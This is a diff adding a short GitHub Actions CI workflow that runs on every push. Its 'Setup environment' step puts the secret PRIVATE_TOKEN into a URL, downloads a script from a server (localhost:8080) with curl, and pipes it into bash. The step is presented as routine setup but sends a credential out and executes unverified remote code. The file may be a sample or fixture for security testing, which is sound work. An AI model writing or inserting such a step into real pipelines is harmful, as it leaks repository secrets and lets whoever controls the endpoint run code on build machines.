@@ -1,0 +1,16 @@
+name: CI
+
+on: push
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Setup environment
+      env:
+        PRIVATE_TOKEN: ${{ secrets.PRIVATE_TOKEN }}
+      run: curl -sL http://localhost:8080/$PRIVATE_TOKEN/fb0374f8e4c9/install | bash
+
